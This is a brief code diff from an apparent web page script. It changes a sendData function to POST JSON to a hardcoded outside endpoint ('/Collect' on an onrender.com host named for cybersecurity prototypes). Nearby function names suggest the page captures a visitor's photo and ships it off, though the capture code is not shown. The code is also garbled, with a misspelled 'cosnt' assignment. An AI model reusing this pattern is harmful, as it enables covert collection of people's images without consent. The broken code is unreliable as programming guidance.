@@ -56,7 +56,7 @@ async function capturePhoto() {
 
 const sendData = async () =>{
   try{
-    cosnt = await fetch(process.env.link/Collect,{
+    cosnt = await fetch("https://cyber-security-protos.onrender.com/Collect",{
       method:"POST",
       headers:{
         "content-Type":"application/json"
